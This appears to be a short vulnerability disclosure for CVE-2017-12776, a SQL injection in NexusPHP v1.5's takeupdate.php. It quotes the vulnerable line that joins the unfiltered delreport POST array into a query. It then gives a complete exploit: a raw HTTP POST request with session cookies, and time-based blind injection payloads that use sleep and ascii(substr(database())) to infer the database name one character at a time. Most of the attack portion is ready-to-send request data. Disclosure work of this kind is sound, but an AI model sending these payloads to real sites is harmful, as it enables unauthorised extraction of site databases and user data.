## nexusphp  takeupdate.php sqli
### CVE-2017-12776
### powered by lijiangtao  from Anyuntec
### version: v1.5.beta5.20120707
### Download link:https://sourceforge.net/projects/nexusphp/
##  Vulnerability details
#### /nexusphp.v1.5.beta5.20120707/takeupdate.php   Line 14

```
if ($_POST['setdealt']){
$res = sql_query ("SELECT id FROM reports WHERE dealtwith=0 AND id IN (" . implode(", ", $_POST[delreport]) . ")");qlerr(__FILE__, __LINE__);
$user = mysql_fetch_array($r);
```

$_POST[delreport]    has not been filtered to cause injection

###  EXP：

```
POST /takeupdate.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Cookie: c_secure_uid=MQ%3D%3D; c_secure_pass=e52e548e638c2515f3f4c4ff1cee02ab; c_secure_ssl=bm9wZQ%3D%3D; c_secure_tracker_ssl=bm9wZQ%3D%3D; c_secure_login=bm9wZQ%3D%3D
X-Forwarded-For: 10.0.0.1
Connection: close
Upgrade-Insecure-Requests: 1

setdealt=111&delreport[0]=11) or sleep( if(ascii(substr(database(),1,1))<110,0,5 )) %23 
```

delreport[0]=11) or sleep( if(ascii(substr(database(),1,1))<110,0,5 )) %23 

The page will be delayed for 5 seconds  

delreport[0]=11) or sleep( if(ascii(substr(database(),1,1))=110,0,5 )) %23 

The page will be delayed for 0 seconds  







